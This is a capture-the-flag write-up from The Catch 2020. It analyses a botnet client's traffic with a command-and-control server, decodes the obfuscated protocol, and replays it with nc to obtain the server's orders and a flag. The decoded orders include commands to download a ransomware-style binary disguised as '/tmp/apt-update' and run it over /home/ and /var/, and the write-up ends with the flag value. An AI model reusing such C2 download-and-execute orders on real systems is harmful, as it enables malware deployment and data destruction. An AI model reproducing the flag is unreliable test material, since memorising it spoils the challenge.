# The Connection

Hi executive senior investigator!

Cool, you have found the malware dropped on target computer. According to your defined procedure and your previously detected IoC (indicators of compromise), we were able to find other versions of malware in traffic dumps - we assume it is some kind of botnet client. Unfortunatelly, it looks like the C2 server has been meanwhile upgraded and although the server reacts to client's messages, the client can't decode the orders. You should investigate the communication.

Use password `ThE-CaNDc-cONNecTiOn-20` to [download the evidence](the_connection.zip)

Good luck!

---

Download and unzip the evidence:

```
$ ls
botnet_client
botnet_client.md5
```

The client is an ELF binary so let's run it under Linux:
```
$ ./botnet_client -ip 78.128.216.92 -p 20210
The Catch 2020 Botnet Client started (server on 78.128.216.92 port 20210)
Received unknown order
Received unknown order
Received unknown order
Received unknown order
Received unknown order
Received unknown order
```

Interesting fact is that the orders are being received fast in the beginning but getting slower
and slower (apparently exponentially ~ 1s, 2s, 4s, 8s, 16s, ...).
Actually, it makes sense because the client is broken
(see [Exponential backoff](https://en.wikipedia.org/wiki/Exponential_backoff)).

Capture the network traffic using _Wireshark_ and filter with `ip.addr == 78.128.216.92`.
There are the first 3 messages extracted from the TCP streams (`>` client request , `<` server response):
```
Message #1:
>
0040   .. .. 00 00 00 00 00 00 00 17 61 79 37 67 72 33   ..........ay7gr3
0050   32 76 69 38 39 6e 70 66 30 7a 3b 3b 72 65 61 64   2vi89npf0z;;read
0060   79                                                y
<
0040   .. .. 00 00 00 00 00 00 00 34 4d 6a 4d 35 4d 7a   .........4MjM5Mz
0050   51 7a 4d 44 4d 78 4d 32 49 7a 59 6a 4d 30 4e 7a   QzMDMxM2IzYjM0Nz
0060   6b 32 4d 54 59 33 4e 33 6f 77 5a 6e 42 75 4f 54   k2MTY3N3owZnBuOT
0070   68 70 64 6a 49 7a 63 6d 63 33 65 57 45 3d         hpdjIzcmc3eWE=

Message #2:
>
0040   .. .. 00 00 00 00 00 00 00 17 61 79 37 67 72 33   ..........ay7gr3
0050   32 76 69 38 39 6e 70 66 30 7a 3b 3b 72 65 61 64   2vi89npf0z;;read
0060   79                                                y
<
0040   .. .. 00 00 00 00 00 00 00 30 4e 54 4d 35 4d 7a   .........0NTM5Mz
0050   67 7a 4f 54 4e 69 4d 32 49 7a 4e 44 63 35 4e 6a   gzOTNiM2IzNDc5Nj
0060   45 32 4e 7a 64 36 4d 47 5a 77 62 6a 6b 34 61 58   E2Nzd6MGZwbjk4aX
0070   59 79 4d 33 4a 6e 4e 33 6c 68                     YyM3JnN3lh

Message #3:
>
0040   .. .. 00 00 00 00 00 00 00 17 61 79 37 67 72 33   ..........ay7gr3
0050   32 76 69 38 39 6e 70 66 30 7a 3b 3b 72 65 61 64   2vi89npf0z;;read
0060   79                                                y
<
0040   .. .. 00 00 00 00 00 00 00 30 4e 54 4d 31 4d 7a   .........0NTM1Mz
0050   4d 7a 4f 54 4e 69 4d 32 49 7a 4e 44 63 35 4e 6a   MzOTNiM2IzNDc5Nj
0060   45 32 4e 7a 64 36 4d 47 5a 77 62 6a 6b 34 61 58   E2Nzd6MGZwbjk4aX
0070   59 79 4d 33 4a 6e 4e 33 6c 68                     YyM3JnN3lh
```

Notice that all messages are padded with 7 `00` followed by the length byte.
To decode from `base64`, we must not include this length byte!
```
$ echo MjM5MzQzMDMxM2IzYjM0Nzk2MTY3N3owZnBuOThpdjIzcmc3eWE= | base64 -d
2393430313b3b347961677z0fpn98iv23rg7ya
```

Nice, looks like a hex decoded string followed by the same client ID just in reverse
(`ay7gr32vi89npf0z` vs `z0fpn98iv23rg7ya`).

Reverse the hex decoded string and decode it:
```
$ echo 2393430313b3b347961677 | rev | xxd -r -p
wait;;10492
```

Ok, we should wait... Let's rather decode more messages:
```
# Message #2:
$ echo NTM5MzgzOTNiM2IzNDc5NjE2Nzd6MGZwbjk4aXYyM3JnN3lh | base64 -d | rev | cut -c17- | xxd -r -p
wait;;9895

# Message #3:
$ echo NTM1MzMzOTNiM2IzNDc5NjE2Nzd6MGZwbjk4aXYyM3JnN3lh | base64 -d | rev | cut -c17- | xxd -r -p
wait;;9355
```

The wait value is decreasing with every new message but given the client is sending messages exponentially
slower and slower, this is going to take a long time.

Let's do better and make our own client!

The client request is always the same. Save it into file `request.bin`:
```
echo 000000000000001761793767723332766938396e7066307a3b3b7265616479 | xxd -r -p > request.bin
```

Use `nc` to replace the `botnet_client`:
```
$ (nc 78.128.216.92 20210 < request.bin) | cut -c9- | base64 -d | rev | cut -c17- | xxd -r -p
wait;;6190
```

Cool, it works. Now we can send the messages much faster!
```
wait;;5457
wait;;4593
wait;;3114
wait;;2499
wait;;1495
wait;;943
wait;;250
download;;http://challenges.thecatch.cz:20102/ransomvid1984.bin;;/tmp/apt-update
download;;http://challenges.thecatch.cz:20102/key1984.RV20;;/tmp/key
execute;;/tmp/apt-update -k /tmp/key -p /home/
execute;;/tmp/apt-update -k /tmp/key -p /var/
wait;;12859
wait;;11471
```

Call the URLs:
```
$ curl http://challenges.thecatch.cz:20102/ransomvid1984.bin
FLAG{kT0c-WTfc-S326-Jp1A}

$ curl http://challenges.thecatch.cz:20102/key1984.RV20
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA39utkD1Qtw0XEjLcZfiy
10nvC+ncTjWWxTZJ0/O5zvGzgLHJMlk8BGNhx+TcSmY9GmZfo+F0dGB6hSBj/o6z
2sbe7zxOugNTSf44nHrquN7fDP2ewX7w0loepNyX10YxOyGI+eoRt4OlVIPkTVZT
4UysJG5WGc+HwNygT/zBykEIHBT72CivrZL1keBL/Ud/okkQ9maL/ygVkKsRIpU3
yQs/eaxNHEa9jaacQAX6XHYPRyimlmCphiDkxRGvvH5o5qQLiuhQpOcJwR5NFOe3
gN99RzfWj7cc5HwUILweLJDdf9fgHEThxrf5XfY/Mp5Z/8HKh4K8iQ9pPQiiQpOD
+QIDAQAB
-----END PUBLIC KEY-----
```

[key1984.RV20.txt](key1984.RV20.txt) might be useful in the next challenge!

The flag is `FLAG{kT0c-WTfc-S326-Jp1A}`
